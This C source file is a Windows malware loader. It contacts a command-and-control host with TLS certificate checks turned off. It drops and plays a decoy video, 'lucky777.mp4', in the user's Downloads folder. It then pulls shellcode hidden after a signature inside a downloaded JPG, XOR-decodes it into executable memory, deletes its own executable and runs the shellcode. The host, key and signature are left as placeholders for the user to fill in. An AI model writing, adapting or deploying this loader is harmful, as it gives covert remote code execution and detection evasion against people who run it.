#include <windows.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

#define C2_HOST L"YOUR IP"
#define C2_PORT 443
#define VIDEO_PATH L"/to/your/mp4"
#define JPG_PATH L"/to/your/jpg"
#define XOR_KEY "YOUR XOR KEY"
#define SIGNATURE "YOUR SIGNATURE"

void play(BYTE* data, DWORD data_size, LPCWSTR data_path) {
    if (!data || !data_path) return;

    HANDLE file_handle = CreateFileW(data_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(file_handle, data, data_size, &written, NULL);
        CloseHandle(file_handle);

        wchar_t cmd[MAX_PATH + 10];
        wsprintfW(cmd, L"cmd.exe /c start \"\" \"%s\"", data_path);
        STARTUPINFOW startup_info = {sizeof(startup_info)};
        PROCESS_INFORMATION process_info = {0};
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info);
        CloseHandle(process_info.hThread);
        CloseHandle(process_info.hProcess);
    }
}

BYTE* download(HINTERNET connection, LPCWSTR path, DWORD* out_size) {
    HINTERNET request = WinHttpOpenRequest(connection, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!request) return NULL;

    // for SSL/TLS error
    DWORD dw_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &dw_flags, sizeof(dw_flags));

    BYTE* buffer = NULL;
    if (WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        if (WinHttpReceiveResponse(request, NULL)) {
            DWORD dw_downloaded = 0;
            DWORD total_size = 0;
            BYTE temp[4096];
            while (WinHttpReadData(request, temp, sizeof(temp), &dw_downloaded) && dw_downloaded > 0) {
                BYTE* new_buffer = (BYTE*)realloc(buffer, total_size + dw_downloaded);
                if (new_buffer) {
                    buffer = new_buffer;
                    memcpy(buffer + total_size, temp, dw_downloaded);
                    total_size += dw_downloaded;
                }
            }
            *out_size = total_size;
        }
    }
    
    WinHttpCloseHandle(request);
    return buffer;
}


int WINAPI WinMain(HINSTANCE instance_handle, HINSTANCE prev_instance_handle, LPSTR option, int flag) {
    HINTERNET session = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET connection = WinHttpConnect(session, C2_HOST, C2_PORT, 0);

    // for video settings
    wchar_t video_path[MAX_PATH];
    GetEnvironmentVariableW(L"USERPROFILE", video_path, MAX_PATH);
    lstrcatW(video_path, L"\\Downloads\\lucky777.mp4");

    DWORD video_size = 0;
    BYTE* video_data = download(connection, VIDEO_PATH, &video_size);
    
    play(video_data, video_size, video_path);
    free(video_data);

    // for shellcode settings
    DWORD jpg_size = 0;
    BYTE* jpg_data = download(connection, JPG_PATH, &jpg_size);

    void* exec_memory = NULL;
    const size_t signature_len = sizeof(SIGNATURE) - 1;
    if (jpg_data) {
        for (DWORD i = 0; i < jpg_size - signature_len; i++) {
            if (memcmp(jpg_data + i, SIGNATURE, signature_len) == 0) {
                DWORD payload_size = jpg_size - (i + signature_len);
                exec_memory = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // for process injection (itself)
                if (exec_memory) {
                    size_t key_len = lstrlenA(XOR_KEY);
                    for (DWORD j = 0; j < payload_size; j++) {
                        ((BYTE*)exec_memory)[j] = (jpg_data + i + signature_len)[j] ^ XOR_KEY[j % key_len]; // xor
                    }
                }
                break;
            }
        }
        free(jpg_data);
    }

    // self destruction
    wchar_t self_path[MAX_PATH];
    wchar_t cmd[MAX_PATH * 2];
    STARTUPINFOW startup_info = {sizeof(startup_info)};
    PROCESS_INFORMATION process_info = {0};
    GetModuleFileNameW(NULL, self_path, MAX_PATH);

    wsprintfW(cmd, L"cmd.exe /c timeout /t 10 & del /f /q \"%s\"", self_path);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startup_info, &process_info);
    CloseHandle(process_info.hThread);
    CloseHandle(process_info.hProcess);

    // execute shellcode
    if (exec_memory) ((void(*)())exec_memory)();

    WinHttpCloseHandle(connection);
    WinHttpCloseHandle(session);
    return 0;
}